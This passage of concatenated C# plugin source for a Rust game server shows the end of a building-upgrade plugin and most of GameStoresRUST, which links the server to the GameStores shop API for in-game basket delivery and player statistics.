                var = Config.ConvertValue<T>(Config[mainMenu, key]);
                return false;
            }

            Config[mainMenu, key] = var;
            return true;
        }
        
        private static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        private static double CurrTimestamp() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        #endregion
    }
}

// --- End of file: DVBuildingUpgrade.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/GameStoresRUST.cs ---
// --- Original Local Path: HudRust/GameStoresRUST.cs ---

﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;
using WebSocketSharp;

namespace Oxide.Plugins
{
    [Info("GameStoresRUST", "HOUGAN & Sstine # GAMESTORES", "0.3.5")]
    public class GameStoresRUST : RustPlugin
    {
        #region References

        [PluginReference] private Plugin ImageLibrary;

        #endregion

        #region Classes

        private static class Delays
        {
            [JsonProperty("Игроки с активными запросами к АПИ")]
            public static List<ulong> ItemList = new List<ulong>();
            [JsonProperty("Количество запросов за последнюю секунду")]
            public static int RequestPerSecond = 0;
            [JsonProperty("Ограничение запросов в секунду")]
            public static int RequestPerSecondLimit = 20;

            public static bool CanRequest(BasePlayer player)
            {
                if (RequestPerSecond > RequestPerSecondLimit)
                {
                    return false;
                }

                if (ItemList.Contains(player.userID))
                {
                    player.ChatMessage($"Пожалуйста, дождитесь <<окончания>> предыдущего действия!");
                    return false;
                }
                return true;
            }

            public static void FinishRequest(BasePlayer player)
            {
                if (ItemList.Contains(player.userID))
                    ItemList.Remove(player.userID);
            }

            public static IEnumerator MakeRequest(BasePlayer player)
            {
                RequestPerSecond++;

                if (ItemList.Contains(player.userID)) yield return null;
                ItemList.Add(player.userID);

                yield return new WaitForSeconds(3f);
                if (ItemList.Contains(player.userID))
                    ItemList.Remove(player.userID);
            }
        }

        private class Stats
        {

        }

        private class Configuration
        {
            public class API
            {
                [JsonProperty("ИД магазина в сервисе")]
                public string ShopID = "UNDEFINED";
                [JsonProperty("ИД сервера в сервисе")]
                public string ServerID = "UNDEFINED";
                [JsonProperty("Секретный ключ (не распространяйте его)")]
                public string SecretKey = "UNDEFINED";
            }

            public class Interface
            {
                [JsonProperty("Включить изображение корзины")]
                public bool BucketEnable = true;
                [JsonProperty("Включить отображение названий предметов")]
                public bool TextShow = true;
                [JsonProperty("Ссылка на изображение корзины (BUCKET - стандартное изображение)")]
                public string BucketURL = "BUCKET";
                [JsonProperty("Количество предметов на строке")]
                public int ItemOnString = 7;
                [JsonProperty("Количество строк в интерфейсе")]
                public int StringAmount = 3;
                [JsonProperty("Сторона одного предмета")]
                public int ItemSide = 150;
                [JsonProperty("Отступ между предметами")]
                public int ItemMargin = 5;
            }

            public class TOP
            {
                [JsonProperty("Отправлять данные топа игроков")]
                public bool UseTop = true;
            }

            [JsonProperty("Настройки API плагина")]
            public API APISettings = new API();
            [JsonProperty("Настройки интерфейса плагина")]
            public Interface InterfaceSettings = new Interface();
            [JsonProperty("Настройки статистики сервера")]
            public TOP TOPSettings = new TOP();
        }

        private class WItem
        {
            public string ID;
            public string Name;
            public int ItemID;
            public int Amount;
            public string ShortName;
            public string Command;
            public string ImageUrl;

            public bool Blocked;
            public double Block_Date = 0;
            public bool IsBlueprint;
            public bool IsCommand;
            public bool IsItem;

            public WItem(Dictionary<string, object> data, bool show = true)
            {
                try
                {
                    if (data.ContainsKey("id")) ID = data["id"].ToString();

                    if (data.ContainsKey("name")) Name = data["name"].ToString();
                    if (data.ContainsKey("item_id")) ItemID = System.Convert.ToInt32(data["item_id"]);
                    if (data.ContainsKey("amount")) Amount = System.Convert.ToInt32(data["amount"]);
                    if (data.ContainsKey("command")) Command = data["command"].ToString();
                    if (data.ContainsKey("img")) ImageUrl = data["img"].ToString();

                    if (data.ContainsKey("blocked")) Blocked = bool.Parse(data["blocked"].ToString());

                    if (data.ContainsKey("block_date") && data["block_date"] is int)
                    {
                        double.TryParse(data["block_date"].ToString(), out Block_Date);
                    }

                    if (data.ContainsKey("type"))
                    {
                        IsBlueprint = data["type"].ToString() == "bp";
                        IsCommand = data["type"].ToString() == "command";
                        IsItem = data["type"].ToString() == "item";
                    }

                    if (ItemID != 0)
                    {
                        var itemInfo = ItemManager.FindItemDefinition(ItemID);
                        if (itemInfo != null) ShortName = itemInfo.shortname;
                        else if (IDToShortName.ContainsKey(ItemID))
                        {
                            itemInfo = ItemManager.FindItemDefinition(IDToShortName[ItemID]);
                            if (itemInfo == null) return;

                            ShortName = itemInfo.shortname;
                        }
                    }

                    var imageLibrary = instance.plugins.Find("ImageLibrary");
                    if (imageLibrary != null)
                    {
                        if (ItemID == 0)
                        {
                            if ((bool)imageLibrary.Call("HasImage", $"IconGS.{ID}"))
                            {
                                string probablyId = (string)imageLibrary.Call("GetImage", $"IconGS.{ID}");
                                if (!probablyId.IsNullOrEmpty() && probablyId != instance.NoImageID && probablyId != instance.LoadingImageID)
                                    ImageUrl = probablyId;
                                return;
                            }

                            if (!ImageUrl.IsNullOrEmpty())
                            {
                                imageLibrary.Call("AddImage", ImageUrl.Replace("https", "http"), $"IconGS.{ID}");
                            }
                        }
                        else
                        {
                            string probablyId = (string)imageLibrary.Call("GetImage", ShortName);
                            if (!probablyId.IsNullOrEmpty() && probablyId != instance.NoImageID && probablyId != instance.LoadingImageID)
                                ImageUrl = probablyId;
                        }
                    }
                }
                catch (NullReferenceException e)
                {
                    Interface.Oxide.LogError(JsonConvert.SerializeObject(data));
                }
            }
        }

        #endregion

        #region Variables

        private static bool initialization = false;
        private static bool Initialized = false;
        private static GameStoresRUST instance;
        private static Configuration Settings = new Configuration();
        private string ShopURL = "UNDEFINED";
        private int StartBalance = 0;
        public string NoImageID = "";
        public string LoadingImageID = "";
        private Coroutine LoadingCoroutine;
        private Dictionary<int, Dictionary<ulong, int>> ListTimeOutCommand = new Dictionary<int, Dictionary<ulong, int>>();
        private Dictionary<ulong, List<int>> playersBasketCache = new Dictionary<ulong, List<int>>();
        private HashSet<ulong> ListBannedCommandUserID = new HashSet<ulong>();
        private Timer TimerCheckInstant;
        private string MainApiLink = $"https://gamestores.ru/api/";
        private string ReserveApiLink = $"https://gs.gamestores.ru/api/";
        //private string BaseRequest => $"https://gamestores.ru/api/?shop_id={Settings.APISettings.ShopID}&secret={Settings.APISettings.SecretKey}{(!Settings.APISettings.ServerID.IsNullOrEmpty() && Settings.APISettings.ServerID != "0" && Settings.APISettings.ServerID != "1" && Settings.APISettings.ServerID != "UNDEFINED" ? $"&server={Settings.APISettings.ServerID}" : "")}";
        private string BaseRequestParams => $"?shop_id={Settings.APISettings.ShopID}&secret={Settings.APISettings.SecretKey}{(!Settings.APISettings.ServerID.IsNullOrEmpty() && Settings.APISettings.ServerID != "0" && Settings.APISettings.ServerID != "1" && Settings.APISettings.ServerID != "UNDEFINED" ? $"&server={Settings.APISettings.ServerID}" : "")}";
        private string BaseRequest = "";
        #endregion

        #region Interface

        private int TryImageCounter = 0;
        [PluginReference] Plugin XMenu;
        Timer TimerInitialize;

        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";

        private void OnServerInitialized()
        {
            BaseRequest = MainApiLink + BaseRequestParams;
            if (Settings.APISettings.ServerID != "0" && Settings.APISettings.ServerID != "UNDEFINED")
            {
                TimerCheckInstant = timer.Repeat(20, 0, CheckInstant);
            } else
            {
                LogAction(null, $"Некорректный ServerID, автоматическая выдача команд невозможна");
                PrintError($"Incorrect ServerID, reciving auto commands (Products) disabled");
            }
            TimerInitialize = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterMenu", this.Name, "Store", "assets/icons/bite.png", "RenderStore", null);

                    cmd.AddChatCommand("store", this, (p, cmd, args) => rust.RunClientCommand(p, "custommenu true Store"));
                    TimerInitialize.Destroy();
                }
            });

            if (!ImageLibrary)
            {
                if (TryImageCounter < 3)
                {
                    LogAction(null, $"ImageLibrary is not initialized, try again in 1 sec.", true);
                    TryImageCounter++;

                    timer.Once(1, OnServerInitialized);
                    return;
                }
                else LogAction(null, $"Starting without ImageLibrary", true);
            }

            if (ImageLibrary)
            {
                NoImageID = (string)ImageLibrary.Call("GetImage", "NONE");
                LoadingImageID = (string)ImageLibrary.Call("GetImage", "LOADING");
            }

            if (Settings.InterfaceSettings.BucketURL.Contains("http") && plugins.Find("ImageLibrary") != null)
            {
                ImageLibrary.Call("AddImage", Settings.InterfaceSettings.BucketURL, "GameStoresRUSTBucket");
                LoadingCoroutine = ServerMgr.Instance.StartCoroutine(WaitForLoad());
            }
            else
            {
                //BasePlayer.activePlayerList.ForEach(OnPlayerInit);
                for (var i = 0; i < BasePlayer.activePlayerList.Count; i++)
                {
                    OnPlayerConnected(BasePlayer.activePlayerList[i]);
                }
            }

            instance = this;
            if (!Settings.TOPSettings.UseTop) Unsubscribe(nameof(OnEntityDeath));
            if (!Settings.TOPSettings.UseTop) Unsubscribe(nameof(OnPlayerDisconnected));

            if (Settings.APISettings.ShopID == "UNDEFINED" || Settings.APISettings.SecretKey == "UNDEFINED")
            {
                LogAction(null, $"Verify that plugin is installed correct! Some of API settings are 'UNDEFINED'", true, true);
                return;
            }

            timer.Once(2, FetchShopUrl);

            timer.Every(1, () => Delays.RequestPerSecond = 0);

            ListTimeOutCommand[0] = new Dictionary<ulong, int>();
            ListTimeOutCommand[1] = new Dictionary<ulong, int>();
            ListTimeOutCommand[2] = new Dictionary<ulong, int>();

            int totalTick = 0;
            int tick = 0;
            timer.Repeat(2, 0, () =>
            {
                if (totalTick == 30)
                {
                    totalTick = 0;
                    ListBannedCommandUserID.Clear();
                }
                ListTimeOutCommand[0].Clear();
                if (tick == 3 || tick == 6)
                {
                    ListTimeOutCommand[1].Clear();
                }

                if (tick == 6)
                {
                    tick = 0;
                    ListTimeOutCommand[2].Clear();
                }
                tick++;
                totalTick++;
            });
        }

        private IEnumerator WaitForLoad()
        {
            while (!(bool)ImageLibrary.Call("HasImage", "GameStoresRUSTBucket"))
            {
                PrintError($"Image of bucket is loading!");
                yield return new WaitForSeconds(1);
            }

            PrintWarning("Image of bucket loaded correct!");
            //BasePlayer.activePlayerList.ForEach(OnPlayerInit);
            for (var i = 0; i < BasePlayer.activePlayerList.Count; i++)
            {
                OnPlayerConnected(BasePlayer.activePlayerList[i]);
            }
            yield return 0;
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                Settings = Config.ReadObject<Configuration>();
                if (Settings?.APISettings == null) LoadDefaultConfig();
            }
            catch
            {
                LogAction(null, $"Error reading config, creating one new config!", true, true);
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }

        protected override void LoadDefaultConfig()
        {
            Settings = new Configuration();
        }

        protected override void SaveConfig() => Config.WriteObject(Settings);

        private void Unload()
        {
            //if (Initialized) StatHandler.SendStats();

            if (LoadingCoroutine != null) ServerMgr.Instance.StopCoroutine(LoadingCoroutine);
            //BasePlayer.activePlayerList.ForEach(p => CuiHelper.DestroyUi(p, IconLayer));
            //BasePlayer.activePlayerList.ForEach(p => CuiHelper.DestroyUi(p, StoreLayer));
            foreach (var pl in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(pl, IconLayer);
                CuiHelper.DestroyUi(pl, StoreLayer);
                OnPlayerConnected(pl);
            }
        }

        #endregion

        #region Hooks

        private void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            StatHandler.AddStat(new StatHandler.TimeStat(player));
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (player.IsReceivingSnapshot)
            {
                NextTick(() => OnPlayerConnected(player));
                return;
            }

            if (Settings.InterfaceSettings.BucketEnable)
                InitializeIcon(player);
        }

        #endregion

        #region Stats

        private static class StatHandler
        {
            internal class Stat
            {
                [JsonProperty("dataType")]
                public string DataType;
            }
            internal class KillStat : Stat
            {
                [JsonProperty("player_id")]
                public string PlayerUserId;
                [JsonProperty("victim_id")]
                public string VictimUserID;
                [JsonProperty("type")]
                public string Type;
                [JsonProperty("time")]
                public string Time;
            }
            internal class TimeStat : Stat
            {
                [JsonProperty("player_id")]
                public string PlayerID;
                [JsonProperty("username")]
                public string PlayerName;
                [JsonProperty("played")]
                public string Played;
                [JsonProperty("time")]
                public string Time;

                public TimeStat(BasePlayer player)
                {
                    PlayerID = player.UserIDString;
                    PlayerName = player.displayName;
                    DataType = "leave";
                    Played = player.secondsConnected.ToString();
                    Time = CurrentTime().ToString();
                }
            }

            private static List<Stat> Stats = new List<Stat>();
            public static void AddStat(Stat stat)
            {
                Stats.Add(stat);
                if (Stats.Count > 10)
                {
                    SendStats();
                    Stats.Clear();
                }
            }

            public static void SendStats()
            {
                try
                {


                    if (!Initialized)
                    {
                        instance.LogAction(null, $"Sending stats error! Plugin not initialized", true, true);
                        return;
                    }
                    if (Stats.Count == 0)
                    {
                        instance.LogAction(null, $"Nothing to send", true);
                        return;
                    }

                    var obj = JsonConvert.SerializeObject(Stats);
                    RequestPost($"&method=topData&data={obj}", (i, s) => {
                        if (i != 200)
                            return;

                        Dictionary<string, object> response = JsonConvert.DeserializeObject<Dictionary<string, object>>(s, new KeyValuesConverter());
                        if (response.ContainsKey("result") && response["result"].ToString() == "success")
                        {
                            instance.LogAction(null, $"GameStores sent stats successful!", true);
                            Stats.Clear();
                        }
                        else
                        {
                            instance.LogAction(null, $"Sending stats error!", true, true);
                        }
                    });


                }
                catch
                {
                    // ignored 
                }
            }
        }

        [ConsoleCommand("sendtop")]
        private void CmdSendTop(ConsoleSystem.Arg args)
        {
            if (args.Player() != null && !args.Player().IsAdmin) return;

            StatHandler.SendStats();
        }

        private void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            if (entity == null || info == null || info.Initiator == null)
                return;
            if (Settings.TOPSettings.UseTop)
            {
                BaseEntity initiator = info.Initiator;

                if (entity as BasePlayer == null && initiator as BasePlayer == null)
                    return;
                StatHandler.KillStat stat = new StatHandler.KillStat();

                if (initiator as BasePlayer != null) stat.PlayerUserId = initiator.ToPlayer().UserIDString;
                else if (initiator.PrefabName.Contains("agents")) stat.PlayerUserId = "1";
                else return;

                if (entity as BasePlayer != null)
                {
                    stat.VictimUserID = entity.ToPlayer().UserIDString;
                    stat.Type = entity.ToPlayer().IsSleeping() ? "sleeper" : "kill";
                }
                else if (entity.PrefabName.Contains("agents"))
                {
                    stat.VictimUserID = "1";
                    stat.Type = "kill";
                }
                else
                {
                    return;
                }

                stat.DataType = "death";

                stat.Time = CurrentTime().ToString();
                StatHandler.AddStat(stat);
            }
        }

        #endregion

        #region Commands

        [ChatCommand("store")]
        private void CmdChatStore(BasePlayer player, string command, string[] args)
        {
            if (player == null || player.Connection == null || player.IsSleeping())
            {
                return;
            }

            if (!Initialized)
            {
                errorsReq++;
                player.ChatMessage($"Плагин магазина запущен не корретно");
                return;

            }

            if (args.Length == 1 && args[0].ToLower() == "hide")
            {
                CuiHelper.DestroyUi(player, IconLayer);
            }
            else
            {
                if (!Delays.CanRequest(player)) return;
                //InitializeStore(player, 0, true);
            }
        }

        [ConsoleCommand("UI_GameStoresRUST")]
        private void CmdConsoleCommand(ConsoleSystem.Arg args)
        {
            BasePlayer player = args.Player();
            if (player == null) return;

            if (ListBannedCommandUserID.Contains(player.userID))
            {
                player.ChatMessage("Вы сделали слишком много запросов. Отдохните немного, скоро возможность выполнять действие к вам вернется.");
                return;
            }

            if (ListTimeOutCommand[0].ContainsKey(player.userID) == false)
                ListTimeOutCommand[0][player.userID] = 1;
            else
                ListTimeOutCommand[0][player.userID] = ListTimeOutCommand[0][player.userID] + 1;

            if (ListTimeOutCommand[1].ContainsKey(player.userID) == false)
                ListTimeOutCommand[1][player.userID] = 1;
            else
                ListTimeOutCommand[1][player.userID] = ListTimeOutCommand[1][player.userID] + 1;

            if (ListTimeOutCommand[2].ContainsKey(player.userID) == false)
                ListTimeOutCommand[2][player.userID] = 1;
            else
                ListTimeOutCommand[2][player.userID] = ListTimeOutCommand[2][player.userID] + 1;

            if (ListTimeOutCommand[0][player.userID] >= 10 || ListTimeOutCommand[1][player.userID] >= 20 || ListTimeOutCommand[2][player.userID] >= 30)
            {
                this.ListBannedCommandUserID.Add(player.userID);
            }

            if (!args.HasArgs(1))
            {
                player.SendConsoleCommand("chat.say /store");
                return;
            }

            switch (args.Args[0].ToLower())
            {
                case "page":
                    {
                        int page = 0;
                        if (!args.HasArgs(2) || !int.TryParse(args.Args[1], out page)) return;
                        InitializeStore(player, null, page, false);
                        break;
                    }
                case "help":
                    {
                        string helpLayer = StoreLayer + ".Help";
                        CuiHelper.DestroyUi(player, helpLayer);
                        CuiHelper.DestroyUi(player, StoreLayer);

                        CuiElementContainer container = new CuiElementContainer();
                        container.Add(new CuiPanel
                        {
                            CursorEnabled = true,
                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                            Image = { Color = "0 0 0 0.5" },
                        }, MenuContent, helpLayer);

                        container.Add(new CuiLabel
                        {
                            RectTransform = { AnchorMin = "0 0.6", AnchorMax = "1 0.78", OffsetMax = "0 0" },
                            Text = { Text = "ИНСТРУКЦИЯ ПОЛЬЗОВАТЕЛЯ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 34 }
                        }, helpLayer);

                        container.Add(new CuiLabel
                        {
                            RectTransform = { AnchorMin = "0 0.3", AnchorMax = "1 0.72", OffsetMax = "0 0" },
                            Text = { Text = $"Здесь вы можете забрать товары приобретенные у нас в магазине!\n" +
                                                     $"Пополнить счёт можно различными способами: электронные кошельки, карты и т.д.\n" +
                                                     $"Авторизация в магазине происходит при помощи вашего аккаунта STEAM",
                                Font = "robotocondensed-regular.ttf", FontSize = 22, Align = TextAnchor.MiddleCenter
                        }
                        }, helpLayer);

                        string addText = StartBalance > 0 ? $"\n<size=18>При первой авторизации вы получите в подарок <b>{StartBalance} рублей</b>!</size>" : "";
                        container.Add(new CuiLabel
                        {
                            RectTransform = { AnchorMin = "0 0.1", AnchorMax = "1 0.48", OffsetMax = "0 0" },
                            Text = { Text = $"" +
                                                     $"{addText}\n{ShopURL.ToUpper()}", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 32}
                        }, helpLayer);
                        container.Add(new CuiButton
                        {
                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                            Button = { Color = "0 0 0 0", Close = helpLayer, Command = "chat.say /store" },
                            Text = { Text = "" }
                        }, helpLayer);

                        CuiHelper.AddUi(player, container);
                        break;
                    }
                case "take":
                    {
                       
                        if (!args.HasArgs(3)) return;

                        int index = 0, id = 0;
                        if (!int.TryParse(args.Args[1], out index) || !int.TryParse(args.Args[2], out id)) return;

                        if (!playersBasketCache.ContainsKey(player.userID))
                        {
                            player.ChatMessage("Предмет не найден, попробуйте перезапустить корзину");
                            return;
                        } else if (!playersBasketCache[player.userID].Contains(id))
                        {
                            player.ChatMessage("Предмет не найден, попробуйте перезапустить корзину");
                            return;
                        }
                                            
                        if (args.HasArgs(5) && args.Args[3].ToLower() == "blocked")
                        {
                            double left = 0;
                            if (!double.TryParse(args.Args[4], out left)) return;

                            TimeSpan span = TimeSpan.FromSeconds(left);

                            string text = "";
                            if (span.Days >= 1)
                                text += $"{span.Days} дн. ";
                            if (span.Hours >= 1)
                                text += $"{span.Hours} ч. ";
                            if (span.Minutes >= 1)
                                text += $"{span.Minutes} мин. ";
                            if (span.Seconds >= 1)
                                text += $"{span.Seconds} сек.";

                            ShowNotify(player, "Вы не можете забрать этот предмет из корзины!\n" +
                                               $"До его разблокировки осталось: {text}");
                            return;
                        }

                        ShowNotify(player, "Подождите, ваш запрос обрабатывается!");
                        CuiElementContainer container = new CuiElementContainer();

                        if (!Delays.CanRequest(player))
                        {
                            ShowNotify(player, "Подождите, ваш предыдущий запрос ещё обрабатывается!");
                            container.Add(new CuiButton
                            {
                                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                                Button = { Color = "1 1 1 0.2", Close = StoreLayer + ".BlockPanel." + index + ".Open", Command = $"UI_GameStoresRUST take {index} {id}" },
                                Text = { Text = "ПОДОЖДИТЕ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", Color = "1 1 1 0.4", FontSize = 24 }
                            }, StoreLayer + ".BlockPanel." + index, StoreLayer + ".BlockPanel." + index + ".Open");

                            CuiHelper.AddUi(player, container);
                            return;
                        }

                        container.Add(new CuiButton
                        {
                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                            Button = { FadeIn = 1f, Color = "1 1 1 0.2", Close = StoreLayer + ".BlockPanel." + index + ".Open", Command = $"UI_GameStoresRUST take {index} {id}", Material = "" },
                            Text = { Text = "ПОДОЖДИТЕ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", Color = "1 1 1 0.4", FontSize = 24 }
                        }, StoreLayer + ".BlockPanel." + index, StoreLayer + ".BlockPanel." + index + ".Open");
                        CuiHelper.AddUi(player, container);

                        LogAction(null, $"---------------------------------");
                        LogAction(player, $"Запрос на получение предмета: {id}");
                        Request($"&item=true&steam_id={player.UserIDString}&id={id}", (i, s) =>
                        {
                            switch (i)
                            {
                                case 0:
                                    LogAction(player, $"API не ответило на запрос: {id}");
                                    PrintError("Api does not responded to a request");
                                    if (player != null)
                                    {
                                        player.ChatMessage($"Непредвиденная ошибка со стороны сервера, просим прощения!");
                                        CuiHelper.DestroyUi(player, StoreLayer);
                                    }
                                    break;
                                case 200:
                                    Dictionary<string, object> response = JsonConvert.DeserializeObject<Dictionary<string, object>>(s, new KeyValuesConverter());
                                    if (!response.ContainsKey("data"))
                                    {
                                        LogAction(player, $"Ошибка получения товара, отсутствует Data [{id}]");

                                        container.Clear();
                                        CuiHelper.DestroyUi(player, StoreLayer + ".BlockPanel." + index + ".Open");
                                        container.Add(new CuiButton
                                        {
                                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                                            Button = { FadeIn = 1f, Color = "1 0.5 0.5 0.2", Close = StoreLayer + ".BlockPanel." + index + ".Open", Command = $"UI_GameStoresRUST take {index} {id}", Material = "" },
                                            Text = { Text = "ОШИБКА\nПОЛУЧЕНИЯ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", Color = "1 0.7 0.7 1", FontSize = 24 }
                                        }, StoreLayer + ".BlockPanel." + index, StoreLayer + ".BlockPanel." + index + ".Open");
                                        ShowNotify(player, "Произошла непредвиденная ошибка, попробуйте позже!\n" +
                                                           "Ваш предмет в безопасности, не переживайте!");
                                        CuiHelper.AddUi(player, container);
                                        return;
                                    }

                                    LogAction(player, $"Товар отмечен полученным [{id}]");
                                    Request($"&gived=true&id={id}", (code, newResponse) =>
                                    {
                                        if (code != 200 || JsonConvert.DeserializeObject<JObject>(newResponse)["result"].ToString() != "success")
                                        {
                                            container.Clear();
                                            CuiHelper.DestroyUi(player, StoreLayer + ".BlockPanel." + index + ".Open");
                                            container.Add(new CuiButton
                                            {
                                                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                                                Button = { FadeIn = 1f, Color = "1 0.5 0.5 0.2", Close = StoreLayer + ".BlockPanel." + index + ".Open", Command = $"UI_GameStoresRUST take {index} {id}", Material = "" },
                                                Text = { Text = "ОШИБКА\nПОЛУЧЕНИЯ", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", Color = "1 0.7 0.7 1", FontSize = 24 }
                                            }, StoreLayer + ".BlockPanel." + index, StoreLayer + ".BlockPanel." + index + ".Open");
                                            ShowNotify(player, "Произошла непредвиденная ошибка, попробуйте позже!\n" +
                                                               "Ваш предмет в безопасности, не переживайте!");
                                            CuiHelper.AddUi(player, container);
                                            return;
                                        }
                                        ProcessTake(player, response["data"] as Dictionary<string, object>);
                                    }, player);

                                    container.Clear();
                                    CuiHelper.DestroyUi(player, StoreLayer + ".BlockPanel." + index + ".Open");
                                    container.Add(new CuiButton
                                    {
                                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                                        Button = { FadeIn = 1f, Color = "0.5 1 0.5 0.2", Material = "" },
                                        Text = { Text = "УСПЕШНО\nПОЛУЧЕНО", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", Color = "0.7 1 0.7 1", FontSize = 24 }
                                    }, StoreLayer + ".BlockPanel." + index, StoreLayer + ".BlockPanel." + index + ".Open");

                                    if (playersBasketCache.ContainsKey(player.userID) && playersBasketCache[player.userID].Contains(id))
                                        playersBasketCache[player.userID].RemoveAt(playersBasketCache[player.userID].IndexOf(id));

                                    CuiHelper.AddUi(player, container);
                                    break;
                                case 404:
                                    LogAction(player, $"Сайт не ответил на запрос: {id}");
                                    player.ChatMessage($"Непредвиденная ошибка со стороны сервера, просим прощения!");
                                    CuiHelper.DestroyUi(player, StoreLayer);
                                    LogAction(null, "Response code: 404, please check your configurations", true);
                                    break;
                            }
                        }, player);
                        break;
                    }
            }
        }

        #endregion

        #region Interface

        private static string StoreLayer = "UI_GameStoresRUST_Store";

        private void RenderStore(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-430 -230",
                            OffsetMax = "490 270"
                        },
                    }
            });

            InitializeStore(BasePlayer.FindByID(userID), Container, 0);
        }

        private void InitializeStore(BasePlayer player, CuiElementContainer container, int page, bool first = true)
        {
            bool arg = false;
            if (container == null)
            {
                container = new CuiElementContainer();
                arg = true;
            }

            if (first)
            {
                CuiHelper.DestroyUi(player, StoreLayer);
                container.Add(new CuiPanel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                    Image = { Color = "0 0 0 0.5" },
                }, MenuContent, StoreLayer);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.3 0.9", AnchorMax = "0.7 1", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0" },
                    Text = { Text = "<b>КОРЗИНА СЕРВЕРА</b>", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 32, Color = "1 1 1 0.7" }
                }, StoreLayer, StoreLayer + ".ITT");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0", OffsetMin = "0 -25", OffsetMax = "0 0" },
                    Text = { Text = "Это ваша корзина с покупками, вы можете забрать их в любой момент", Align = TextAnchor.UpperCenter, Font = "robotocondensed-regular.ttf", Color = "1 1 1 0.4" }
                }, StoreLayer + ".ITT");

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.85 0.9", AnchorMax = "0.99 1", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0", Command = "UI_GameStoresRUST help" },
                    Text = { Text = "ПОМОЩЬ", Align = TextAnchor.MiddleLeft, Font = "robotocondensed-regular.ttf", FontSize = 24 }
                }, StoreLayer);
            }

            CuiHelper.DestroyUi(player, StoreLayer + ".BlockPanel");
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.9", OffsetMax = "0 0" },
                Image = { Color = "0 0 0 0" }
            }, StoreLayer, StoreLayer + ".BlockPanel");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1.1", OffsetMax = "0 0" },
                Text = { Text = "Подождите, мы обрабатываем ваш запрос...", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 34 }
            }, StoreLayer + ".BlockPanel", StoreLayer + ".BlockPanel.Text");

            if (arg)
            {
                CuiHelper.AddUi(player, container);
            }

            NextTick(() => 
            {
            Request($"&method=basket&steam_id={player.UserIDString}", (code, response) =>
            {
                switch (code)
                {
                    case 0:
                        {
                            CuiHelper.DestroyUi(player, StoreLayer + ".BlockPanel.Text");
                            CuiElementContainer secondContainer = new CuiElementContainer();
                            secondContainer.Add(new CuiLabel
                            {
                                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                                Text = { Text = "Корзина временно недоступна, попробуйте позже", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 38 }
                            }, StoreLayer + ".BlockPanel", StoreLayer + ".BlockPanel.Text");
                            CuiHelper.AddUi(player, secondContainer);
                            break;
                        }
                    case 200:
                        {
                            var firstInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(response, new KeyValuesConverter());
                            if (firstInfo.ContainsKey("result"))
                            {
                                if (firstInfo["result"].ToString() == "fail")
                                {
                                    if (firstInfo["code"].ToString() == "104")
                                    {
                                        CuiHelper.DestroyUi(player, StoreLayer + ".BlockPanel.Text");
                                        CuiElementContainer secondContainer = new CuiElementContainer();
                                        secondContainer.Add(new CuiLabel
                                        {
                                            RectTransform = { AnchorMin = "0 0.1", AnchorMax = "1 1", OffsetMax = "0 0" },
